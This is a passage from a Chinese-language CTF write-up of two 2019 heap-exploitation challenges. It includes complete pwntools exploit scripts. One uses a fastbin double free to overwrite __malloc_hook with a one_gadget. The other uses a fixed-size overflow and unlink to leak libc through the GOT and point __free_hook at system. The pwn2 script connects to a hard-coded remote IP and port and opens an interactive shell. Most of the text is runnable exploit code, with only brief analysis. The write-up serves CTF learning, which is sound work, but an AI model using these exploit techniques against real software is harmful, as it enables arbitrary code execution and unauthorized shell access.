        delete(7)
        delete(6)
        add(0x60, p64(ptr), '8') #8
        add(0x60, 'a', '9') #9
        add(0x60, 'a', '10') #10
        add(0x60, 'c'*0x10+ 'd'*0x3 + p64(one_gadget), '6')
        io.success("malloc_hook: 0x%x" % malloc_hook)
        io.success("libc_base: 0x%x" % libc_base )
        io.success("one_gadget: 0x%x" % one_gadget)
  1. getshell
    delete(2)
        delete(2)
double free 拿到shell，这里其实malloc一次本地可以拿shell，远程不行，原因未详，可能栈环境对不上
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = True
    # Set up pwntools for the correct architecture
    exe = './' + 'pwn1'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    #ctx.binary = './' + 'pwn1'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        libc = ELF(libc)
        io = remote(host,port)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    def add(size, name, level):
        io.sendlineafter("Your choice : ", "1")
        io.sendlineafter("Length of the name :", str(size))
        io.sendlineafter("The name of this life :", name)
        io.sendlineafter("The level of this life (High/Low) :", level)
    def show():
        io.sendlineafter("Your choice : ", "2")
    def delete(idx):
        io.sendlineafter("Your choice : ", "3")
        io.sendlineafter("Which life do you want to remove: ", str(idx))
    def destroy():
        io.sendlineafter("Your choice : ", "4")
    def exit():
        io.sendlineafter("Your choice : ", "5")
    def exp():
        ptr = 0x00000000006020E0-0x20-0x30-0x6
        add(0x30, "a", "0") #0
        add(0x30, "b", "1") #1
        delete(0) 
        delete(1)
        delete(0)
        add(0x30, p64(ptr), '2') #2
        add(0x30, 'a', '3') #3
        add(0x30, 'a', '4') #4
        add(0x30, 'a'*0x20 + 'b'*5 , '5')#5
        show()
        io.recvuntil("bbbbb")
        stdout_addr = u64(io.recvuntil("Level", drop=True).ljust(8, '\x00'))
        stdout_addr = hex(stdout_addr)[:-2]
        stdout_addr = int(stdout_addr, 16)
        io.success("stdout_addr: 0x%x" % stdout_addr)
        libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']
        realloc_addr = libc_base + libc.symbols['__libc_realloc']
        one_gadget = libc_base + 0x45216 
        one_gadget = libc_base + 0x4526a 
        one_gadget = libc_base + 0xf02a4 
        one_gadget = libc_base + 0xf1147
        malloc_hook = libc_base + libc.symbols['__malloc_hook']
        ptr = malloc_hook-0x20-0x3
        add(0x60, "a", "6")#6
        add(0x60, "b", "7")#7
        delete(6)
        delete(7)
        delete(6)
        add(0x60, p64(ptr), '8') #8
        add(0x60, 'a', '9') #9
        add(0x60, 'a', '10') #10
        add(0x60, 'c'*0x10+ 'd'*0x3 + p64(one_gadget), '6')
        io.success("malloc_hook: 0x%x" % malloc_hook)
        io.success("libc_base: 0x%x" % libc_base )
        io.success("one_gadget: 0x%x" % one_gadget)
        delete(2)
        delete(2)
        #add(0x30, 'a'*0x20+'b'*5,'3')
        #gdb.attach(io)
        '''
        '''
    if __name__ == '__main__':
        exp()
        io.interactive()
## 2019 网络内生安全试验场 pwn2
实战中遇到最简单的一道了？
### 功能分析
  1. new一个新堆块
  2. 删除一个堆块
  3. 展示一个堆块
  4. 修改堆块内容，有趣的是，他是固定大小0x100?
  5. 退出
### 漏洞点分析
    unsigned __int64 record()
    {
      int v1; // [rsp+4h] [rbp-Ch]
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      puts("record which?");
      __isoc99_scanf("%d", &v1);
      if ( buf[v1] != 0LL && v1 >= 0 && v1 <= 9 )
      {
        puts("content?");
        read(0, buf[v1], 0x100uLL);
      }
      return __readfsqword(0x28u) ^ v2;
    }
这里是固定大小，所以申请小堆块可以溢出
### 漏洞利用过程
  1. 我的思路是溢出后unlink，然后在将两个堆块串联起来，unlink里介绍的手法，就是一个堆块指向另一个堆块存指针的地方，然后编辑一个堆块就是编辑地址，编辑另一个堆块就是编辑内容
  2. 初始化操作
    def add(size):
        io.sendlineafter("your choice :\n", "1")
        io.sendlineafter("please input the size :\n", str(size))
    def delete(idx):
        io.sendlineafter("your choice :\n", "2")
        io.sendlineafter("delete which ?\n",str(idx))
    def show(idx):
        io.sendlineafter("your choice :\n", "3")
        io.sendlineafter("show which ?\n", str(idx))
    def record(idx, content):
        io.sendlineafter("your choice :\n", "4")
        io.sendlineafter("record which?\n", str(idx))
        io.sendlineafter("content?\n", content)
    def exit():
        io.sendlineafter("your choice :\n", "5")
  1. unlink
    ptr = 0x6020c0
        add(0x40)
        add(0x80)
        add(0x40)
        add(0x40)
        payload = p64(0) + p64(0x40) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x40)
        payload += p64(0x40)
        payload += p64(0x90)
        record(0, payload)
        record(1, "1"*0x10)
        delete(1)
        #show(0)
  1. 链接两个堆块
    payload = 'a'*0x18 + p64(0x6020c8+0x8) + p64(0) + p64(elf.got['puts'])
        record(0, payload)
        show(2)
  1. 泄露地址
    io.recvuntil("the content is :")
        io.recvline()
        puts_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("puts_addr: 0x%x" % puts_addr)
        libc_base = puts_addr - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        bin_sh_addr = libc_base + libc.search("/bin/sh").next()
        free_hook = libc_base + libc.symbols['__free_hook']
        #gdb.attach(io)
  1. getshell
    record(3, "/bin/sh")
        record(0, p64(free_hook))
        record(2, p64(system_addr))
        delete(3)
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from PwnContext.core import *
    local = False
    # Set up pwntools for the correct architecture
    exe = './' + 'pwn2'
    elf = context.binary = ELF(exe)
    #don't forget to change it
    host = '39.106.94.18'
    port = 32768
    #don't forget to change it
    #ctx.binary = './' + 'pwn2'
    ctx.binary = exe
    libc = args.LIBC or 'libc.so.6'
    ctx.debug_remote_libc = True
    ctx.remote_libc = libc
    if local:
        #context.log_level = 'debug'
        io = ctx.start()
        libc = ELF(libc)
    else:
        io = remote(host,port)
        libc = ELF(libc)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Partial RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      No PIE (0x400000)
    def add(size):
        io.sendlineafter("your choice :\n", "1")
        io.sendlineafter("please input the size :\n", str(size))
    def delete(idx):
        io.sendlineafter("your choice :\n", "2")
        io.sendlineafter("delete which ?\n",str(idx))
    def show(idx):
        io.sendlineafter("your choice :\n", "3")
        io.sendlineafter("show which ?\n", str(idx))
    def record(idx, content):
        io.sendlineafter("your choice :\n", "4")
        io.sendlineafter("record which?\n", str(idx))
        io.sendlineafter("content?\n", content)
    def exit():
        io.sendlineafter("your choice :\n", "5")
    def exp():
        ptr = 0x6020c0
        add(0x40)
        add(0x80)
        add(0x40)
        add(0x40)
        payload = p64(0) + p64(0x40) + p64(ptr-0x18) + p64(ptr-0x10)
        payload = payload.ljust(0x40)
        payload += p64(0x40)
        payload += p64(0x90)
        record(0, payload)
        record(1, "1"*0x10)
        delete(1)
        #show(0)
        payload = 'a'*0x18 + p64(0x6020c8+0x8) + p64(0) + p64(elf.got['puts'])
        record(0, payload)
        show(2)
        io.recvuntil("the content is :")
        io.recvline()
        puts_addr = u64(io.recvline().strip().ljust(8, '\x00'))
        io.success("puts_addr: 0x%x" % puts_addr)
        libc_base = puts_addr - libc.symbols['puts']
        system_addr = libc_base + libc.symbols['system']
        bin_sh_addr = libc_base + libc.search("/bin/sh").next()
        free_hook = libc_base + libc.symbols['__free_hook']
        record(3, "/bin/sh")
        record(0, p64(free_hook))
        record(2, p64(system_addr))
        delete(3)
        #gdb.attach(io)
        #delete(0)
    if __name__ == '__main__':
        exp()
        io.interactive()
## 题目下载地址
[点我，快点我](https://github.com/NoOne-hub/ctf-save)
## 总结
实操的时候发觉自己点是知道了，找漏洞点能力还待提升，利用起来也是得多调试下